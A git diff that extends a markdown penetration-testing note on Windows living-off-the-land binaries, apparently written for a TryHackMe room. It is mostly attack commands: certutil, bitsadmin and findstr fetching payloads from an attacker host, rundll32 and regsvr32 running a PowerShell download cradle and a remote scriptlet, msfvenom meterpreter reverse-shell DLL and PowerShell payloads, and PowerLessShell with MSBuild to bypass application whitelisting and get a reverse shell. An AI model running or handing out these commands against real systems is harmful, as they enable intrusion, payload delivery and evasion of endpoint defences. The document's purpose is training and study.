@@ -39,19 +39,99 @@ Interesting functionality can include:
 ## File Operation
 
 Certutil can download files and encode files. Certutil is a Windows built-in utility for handling certification service.
-```shell-session
+```powershell
 certutil -URLcache -split -f http://Attacker_IP/payload.exe C:\Windows\Temp\payload.exe
 certutil -encode payload.exe Encoded-payload.txt
+certutil -decode Encoded_file payload.txt
 ```
 
 Bitsadmin [BitsAdmin Documentation](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin-transfer) 
-```shell-session
-bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP/payload.exe c:\Users\thm\Desktop\payload.exe
+```powershell
+bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP/payload.exe c:\Users\<user>\Desktop\payload.exe
 ```
-``
 
+Use `findstr` insteading finding text and string patterns in files, find and download remote file from SMB shared folder 
+```powershell
+findstr /V dummystring \\MachineName\ShareFolder\test.exe > C:\Windows\Temp\test.exe
+```
+
+
+## File Execution
+
+Windows has multiple system binaries that can execute others, MITRE [ATT&CK](https://attack.mitre.org/) called  framework, considers this technique as to be term as either Signed Binary Proxy Execution or Indirect Command Execution.
+
+`explorer.exe` is the file manager and system component for Windows and can perform Indirect Command Execution.
+```powershell
+# Located
+# C:\Windows\explorer.exe - Windows 32 bits version
+# C:\Windows\SysWOW64\explorer.exe - Windows 64 bits version
+explorer.exe /root,"C:\Windows\System32\cmd.exe"
+```
+
+Windows Management Instrumentation (`wmic.exe`) see [[WMIC-Commands]] for more), perform [ATT&CK Technique](https://attack.mitre.org/techniques/) called Signed Binary Proxy Execution  
+```powershell
+wmic.exe process call create cmd
+```
+
+Rundll32 is a Microsoft built-in tool that loads and can run local [[Dynamic-Link-Library-Files]], thus run arbitrary payloads and execute JavaScript and PowerShell scripts. This is [ATT&CK Technique](https://attack.mitre.org/techniques/) called Signed Binary Proxy Execution.
+```powershell
+# Embedded eval() function
+rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"cmd\");window.close()");
+```
+
+```powershell
+# run javascript: executing embedded powershell
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://AttackBox_IP/script.ps1');");
+```
+
+
+## Bypassing Application Whitelisting 
+Application Whitelisting is a rule-based (approved X.exe only) Microsoft endpoint security feature that prevents malicious and unauthorized programs from executing in real-time. Therefore [LOLBAS](https://lolbas-project.github.io/) are used to bypasses the whitelisting by being whitelisted.
+
+[Regsvr32](https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/) is used by Windows to register dlls it can be used to execute arbituary binaries and bypass Whitelisting. According to [https://redcanary.com/](https://redcanary.com/) this the third most popular [ATT&CK Technique](https://attack.mitre.org/techniques/T1218/010/) used to execute native code or scripts locally or remotely **in memory**.
+```powershell
+# C:\Windows\System32\regsvr32.exe
+# C:\Windows\SysWOW64\regsvr32.exe
+
+# DLL reverse shell
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f dll -a x86 > live0fftheland.dll 
+# Host and File transfer/Infiltrate it
+c:\Windows\System32\regsvr32.exe c:\Users\<user>\Downloads\live0fftheland.dll
+# OR
+c:\Windows\System32\regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloads\live0fftheland.dll
+# /s - silent mode
+# /n - do not call DLL register server
+# /u - use another server instead as /n used
+# /u - run with unregistered method
+```
+
+
+In 2016, Microsoft added support for the Linux environment on Windows 10,11, and Server 2019: Windows Subsystem for Linux ([WSL](https://docs.microsoft.com/en-us/windows/wsl/about)), and it exists in [two WSL versions](https://docs.microsoft.com/en-us/windows/wsl/compare-versions): WSL1 and WSL2. 
+```powershell
+bash.exe -c cmd.exe # "/path/to/payload!"
+```
+
+## No Powershell
+
+[PowerLessShell](https://github.com/Mr-Un1k0d3r/PowerLessShell.git) *"Run PowerShell command without invoking powershell.exe"* It relies on MSBuild.exe to remotely execute PowerShell scripts and commands without spawning powershell.exe. You can also execute raw shellcode using the same approach.
+
+```bash
+msfvenom -p windows/meterpreter/reverse_winhttps LHOST=$IP LPORT=4443 -f psh-reflection > liv0ff.ps1
+# Listener
+msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost $IP;set lport 4443;exploit"
+# Python2.. to convert the payload to be compatible 
+python2 PowerLessShell.py -type powershell -source /tmp/liv0ff.ps1 -output liv0ff.csproj
+```
+
+On target build the `.csproj` file and wait for the reverse shell!
+```powershell
+c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\<user>\Desktop\liv0ff.csproj
+```
 
 ## References
 [LOLBAS](https://lolbas-project.github.io/)
 [THM Room Living off the land](https://tryhackme.com/room/livingofftheland)
 [BitsAdmin Documentation](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin-transfer)
+[WSL](https://docs.microsoft.com/en-us/windows/wsl/about)
+[https://redcanary.com/](https://redcanary.com/) 
+[ATT&CK](https://attack.mitre.org)
